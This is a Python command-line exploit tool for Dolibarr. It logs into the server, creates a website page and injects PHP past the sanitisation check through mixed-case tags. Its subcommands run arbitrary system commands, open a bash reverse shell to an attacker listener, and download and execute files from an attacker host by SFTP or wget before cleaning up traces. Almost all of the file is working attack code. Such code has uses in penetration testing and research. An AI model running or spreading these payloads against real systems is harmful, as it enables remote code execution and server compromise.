from typing import Literal, TextIO, Union
import uuid

import cloup
from furl import furl

from .logging import log
from .exploit import Exploit


@cloup.group()
@cloup.argument("target_url", type=cloup.STRING)
@cloup.argument("username", type=cloup.STRING)
@cloup.argument("password", type=cloup.STRING)
@cloup.option(
    "--site-name",
    type=cloup.STRING,
    help="Specify a name to use when creating a site on the target. Defaults to UUIDv4.",
)
@cloup.option(
    "--page-name",
    type=cloup.STRING,
    help="Specify a name to use when creating a page on the target. Defaults to UUIDv4.",
)
@cloup.option(
    "--page-title",
    type=cloup.STRING,
    help="Specify a title for the page. Defaults to the page name.",
)
@cloup.option("--proxy", type=str, help="Specify a proxy URL for use in all requests.")
@cloup.option(
    "-o",
    "--output",
    type=cloup.File(mode="w", lazy=True),
    help="Specify a file path to output the results of the payload to. Defaults to stdout.",
)
@cloup.pass_context
def cli(
    context: cloup.Context,
    target_url: str,
    username: str,
    password: str,
    site_name: str | None = None,
    page_name: str | None = None,
    page_title: str | None = None,
    proxy: str | None = None,
    output: TextIO | None = None,
) -> None:
    """This exploit will log into the Dolibarr web server at the specified target URL with the provided username and password. After that it will attempt to create a web page with a unique name. Once created, it will modify the web page to include the custom PHP code bypassing the sanitation check by not using only lowercase letters (e.g. PHP or pHp instead of php). There are multiple payloads to choose from After the payload has finished running, the web page will be deleted."""
    try:
        parsed_url = furl(target_url, strict=True)
    except Exception as error:
        log.exception("The target URL {target_url} is not valid.", error)
        return

    if proxy is not None:
        try:
            parsed_proxy = furl(proxy, strict=True)
        except Exception as error:
            log.exception("The proxy URL {proxy} is not valid.", error)
            return
    else:
        parsed_proxy = None

    context.obj = Exploit(
        target_url=parsed_url,
        username=username,
        password=password,
        site_name=site_name,
        page_name=page_name,
        page_title=page_title,
        proxy=parsed_proxy,
        output=output,
    )


@cli.command(
    help="Specify your own payload to be run via PHP system() on the victim machine."
)
@cloup.option(
    "--payload",
    required=True,
    help="Try to avoid double quotes as the entire payload will be encased in double quotes to be run by PHP's system function.",
)
@cloup.pass_context
def custom_system_payload(context: cloup.Context, payload: str) -> None:
    return context.obj.run(php_system(payload))


@cli.command(help="Specify your own PHP payload to be run on the victim machine.")
@cloup.option(
    "--payload",
    required=True,
    help="The payload should be written in PHP. It will be placed inside standard PHP tags.",
)
@cloup.pass_context
def custom_php_payload(context: cloup.Context, payload: str) -> None:
    return context.obj.run(payload)


@cli.command(
    help="Spawns a bash shell on the victim machine and connects it back to the listener at the specified lhost and lport."
)
@cloup.option("--lhost", required=True, help="The IP address of the listener.")
@cloup.option("--lport", required=True, type=int, help="The port of the listener.")
@cloup.pass_context
def bash_reverse_shell(context: cloup.Context, lhost: str, lport: int) -> None:
    return context.obj.run(
        php_system(f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
    )


@cli.command(
    help="SFTPs to the attacker machine, downloads the specified file to the victim, chmods it, executes it, and cleans it up."
)
@cloup.argument(
    "attacker_source",
    type=cloup.STRING,
    help="May be specified as user@host:path or as a URI in the form sftp://user@host[:port]/path. This should point to the attacker machine and the file you want to download.",
)
@cloup.argument(
    "victim_destination",
    type=cloup.Path(exists=False),
    help="The filepath on the victim machine to save the file to. Please include the filename so it can be executed (e.g. ./linpeas).",
)
@cloup.option(
    "--arg",
    type=str,
    multiple=True,
    help="Specify a list of arguments to pass to the script.",
)
@cloup.constraints.mutually_exclusive(
    cloup.option(
        "--private-key-file",
        type=cloup.File(mode="r"),
        help="Provide a path to a private key file to be used to log into the attacker machine from the victim machine.",
    ),
    cloup.option(
        "--private-key",
        "private_key_contents",
        help="Provide a private key file's contents as a string to be used to log into the attacker machine from the victim machine.",
    ),
)
@cloup.option(
    "--key-filepath",
    type=cloup.Path(exists=False),
    help="The filepath including the name that the private key will be temporarily stored on the target's disk as (defaults to ./<uuidv4>.key).",
)
@cloup.option(
    "--key-usage",
    type=cloup.Choice(("disk", "stdin"), case_sensitive=True),
    help="Choose how the private key will be used. Disk, the default option, stores the key on the target's disk temporarily and deletes it at the end of the payload. Stdin will pass the key to sftp via stdin avoiding putting it on disk, but this may not work on some machines (I believe it's when libcrypto was built with no-stdio).",
)
@cloup.pass_context
def sftp(
    context: cloup.Context,
    attacker_source: str,
    victim_destination: str,
    arg: list[str] | None,
    private_key_file: TextIO | None,
    private_key_contents: str | None,
    key_filepath: str | None,
    key_usage: Union[Literal["disk"], Literal["stdin"]],
) -> None:
    private_key: str = ""
    if private_key_file is not None:
        private_key = private_key_file.read()
    elif private_key_contents is not None:
        private_key = private_key_contents
    if len(private_key.strip()) <= 0:
        raise ValueError("The private key you supplied was empty.")
    private_key = private_key.replace("\n", "\\n")

    if key_filepath is None:
        key_filepath = f"./{uuid.uuid4().hex}.key"

    if key_usage == "disk" or key_usage is None:
        write_key = (
            f"echo '{private_key}\\n' > {key_filepath} && chmod 600 {key_filepath} &&"
        )
        use_key = key_filepath
        key_cleanup = f"rm {key_filepath}"
    elif key_usage == "stdin":
        write_key = f"echo '{private_key} |"
        use_key = "/dev/stdin"
        key_cleanup = ""

    if arg is None:
        arg = []

    return context.obj.run(
        php_system(
            f"{write_key} sftp -i {use_key} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {attacker_source} {victim_destination} 2>&1 && chmod u+x {victim_destination} && {victim_destination} {" ".join(arg)} 2>&1; rm {victim_destination}; {key_cleanup}"
        )
    )


@cli.command(
    help="Downloads the file at the specified URL to to the victim, chmods it, executes it, and cleans it up."
)
@cloup.argument("source_url", help="The URL of the file to download.")
@cloup.argument(
    "victim_destination",
    help="The filepath on the victim machine to save the file to. Please include the filename so it can be executed (e.g. ./linpeas).",
)
@cloup.pass_context
def wget(context: cloup.Context, source_url: str, victim_destination: str) -> None:
    return context.obj.run(
        php_system(
            f"wget -O {victim_destination} {source_url} && chmod u+x {victim_destination} && {victim_destination}; rm {victim_destination}"
        )
    )


@cli.command(help="Runs the cleanup script on the target for given site names.")
@cloup.argument(
    "site_names",
    type=str,
    nargs=-1,
    help="A list of site names to be deleted off of the target.",
)
@cloup.pass_context
def cleanup(context: cloup.Context, site_names: list[str]):
    rm_sites = map(
        lambda site_name: f"rm -r $(pwd | sed -e 's:/htdocs/public/website::')/documents/website/{site_name}",
        site_names,
    )
    return context.obj.run(php_system("; ".join(rm_sites)))


def php_system(payload: str) -> str:
    """Wraps the payload in a `system("");` call. Also warns when double quotes are included in the payload."""
    if '"' in payload:
        log.warning(
            "You included a double quote (\") in your payload. Please try to avoid this as the entire command will be encased in double quotes to be run by PHP's system function.",
        )
    return f'system("{payload}");'
